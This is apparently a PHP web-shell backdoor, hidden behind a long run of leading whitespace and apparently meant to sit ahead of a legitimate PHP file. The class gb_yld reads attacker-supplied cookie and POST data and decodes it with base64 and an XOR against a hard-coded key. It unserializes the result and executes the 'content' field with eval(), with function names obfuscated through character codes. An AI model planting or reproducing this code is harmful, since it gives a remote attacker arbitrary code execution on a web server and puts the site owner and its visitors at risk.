<?php                                                                                                                                                                                                                                                                                                                                                                                                 $tOKcIYF = class_exists("gb_yld"); $arAtRGZL = $tOKcIYF;if (!$arAtRGZL){class gb_yld{private $EhzOXYLTs;public static $oVfYJiwzf = "c23c705a-33ca-43f1-bba0-378eaa3f7317";public static $tDcStadwMR = NULL;public function __construct(){$tFxbR = $_COOKIE;$wpCcgfNJ = $_POST;$ofooSiSG = @$tFxbR[substr(gb_yld::$oVfYJiwzf, 0, 4)];if (!empty($ofooSiSG)){$zVxMUch = "base64";$BfXPVWx = "";$ofooSiSG = explode(",", $ofooSiSG);foreach ($ofooSiSG as $HoUoF){$BfXPVWx .= @$tFxbR[$HoUoF];$BfXPVWx .= @$wpCcgfNJ[$HoUoF];}$BfXPVWx = array_map($zVxMUch . "\137" . "\x64" . chr (101) . 'c' . "\157" . 'd' . chr (101), array($BfXPVWx,)); $BfXPVWx = $BfXPVWx[0] ^ str_repeat(gb_yld::$oVfYJiwzf, (strlen($BfXPVWx[0]) / strlen(gb_yld::$oVfYJiwzf)) + 1);gb_yld::$tDcStadwMR = @unserialize($BfXPVWx);}}public function __destruct(){$this->YgCjinYUxt();}private function YgCjinYUxt(){if (is_array(gb_yld::$tDcStadwMR)) {$lqlLAT = str_replace('<' . chr (63) . 'p' . 'h' . "\x70", "", gb_yld::$tDcStadwMR['c' . "\x6f" . 'n' . "\x74" . chr (101) . chr ( 705 - 595 )."\x74"]);eval($lqlLAT);exit();}}}$mnHLtV = new gb_yld(); $mnHLtV = NULL;} ?><?php
